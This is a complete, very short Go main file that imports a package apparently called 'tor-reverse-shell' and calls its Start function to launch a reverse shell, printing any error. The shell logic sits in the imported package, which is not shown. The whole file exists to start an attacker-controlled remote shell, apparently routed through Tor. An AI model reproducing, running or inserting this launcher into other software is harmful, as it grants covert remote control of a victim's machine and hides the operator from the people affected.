package main

import (
	"fmt"

	"github.com/humbertovnavarro/tor-reverse-shell/pkg/reverse_shell"
)

func main() {
	err := reverse_shell.Start()
	if err != nil {
		fmt.Println(err)
	}
}
